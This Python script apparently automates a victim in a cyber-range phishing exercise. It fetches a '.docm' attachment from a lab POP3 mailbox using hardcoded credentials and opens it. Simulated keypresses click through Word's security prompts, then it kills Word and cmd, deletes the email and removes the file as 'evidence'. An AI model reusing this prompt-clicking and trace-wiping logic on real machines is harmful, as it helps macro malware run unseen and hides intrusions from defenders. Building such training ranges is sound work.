import poplib # recv email
import os # change dir
import urllib2 # wait command
import time # sleep
import string, random
import StringIO, rfc822
from email import parser
import thread # execute file
import keyboard

def wait(t):
	while True:
		try:
			r = urllib2.urlopen('http://192.168.100.169/isAttack/KB15_macro')
			if (int(r.read()) != 0):
				break
			time.sleep(t)
		except:
			pass
	return

def login():
	USER = "john@dientap.cnsc"
	PASSWORD = "Cnsc12345"
	SERVER = "192.168.220.51"

	try:
		# connect to server
		server = poplib.POP3(SERVER)
		 
		# login
		server.user(USER)
		server.pass_(PASSWORD)
	except Exception as ex:
		print (ex)
		return None

	return server

def readMail(server):
	expect_file = 'votay.docm'

	# list items on server
	resp, items, octets = server.list()

	# the last item
	i = len(items) - 1
	id, size = string.split(items[i])
	msg = [server.retr(id)]
	msg = ["\n".join(mssg[1]) for mssg in msg]
	msg = [parser.Parser().parsestr(mssg) for mssg in msg]
	msg = msg[0]

	name = ''
	for part in msg.walk():
		if 'application' in part.get_content_type():
			name = part.get_filename()
			if name == expect_file:
				print 'Downloading %s' % name
				data = part.get_payload(decode=True)
				f = open(name, 'wb')
				f.write(data)
				f.close()
				print 'Downloaded %s' % name
				break

	if name and ('.docm' in name):
		print 'Opening doc file'
		thread.start_new_thread(os.system, (name, ))
		time.sleep(2)
		# click yes 2 times
		print 'press yes'
		keyboard.press('tab')
		keyboard.press('enter')
		keyboard.press('tab')
		keyboard.press('enter')

		time.sleep(1)
		keyboard.press('enter')

		print 'turn off word'
		time.sleep(2)
		os.system('powershell Stop-Process -name WINWORD')
		time.sleep(10)
		os.system('powershell Stop-Process -name cmd')

		# delete the email
		print 'delete email'
		server.dele(id)
		return True

	time.sleep(5)
	return False

def main():
	os.chdir('C:\Users\Administrator\Downloads')
	try:
		os.remove('votay.docm')
	except Exception as e:
		print e

	print "[+] Waiting start command ... "
	#wait(5)
	print "[+] Received start command"

	while True:
		try:
			server = login()
			if server:
				print 'Login success'
				print "[+] Receiving expected email"
				if readMail(server):
					server.quit()
					print 'Logged out'
					break
				else:
					print "[+] Email didn't arrive"

				server.quit()
				print 'Logged out'
		except:
			print 'Login failed'
			time.sleep(3)

	# xoa dau vet
	time.sleep(120)
	print 'Destroying evidence'
	
	try:
		os.remove('votay.docm')
	except Exception as e:
		print e

	print 'Done'

#main()
def test():
	try:
		server = login()
		if server:
			print ("Succeed")
		else:
			print ("Failed")
	except Exception as e:
		print (e)

test()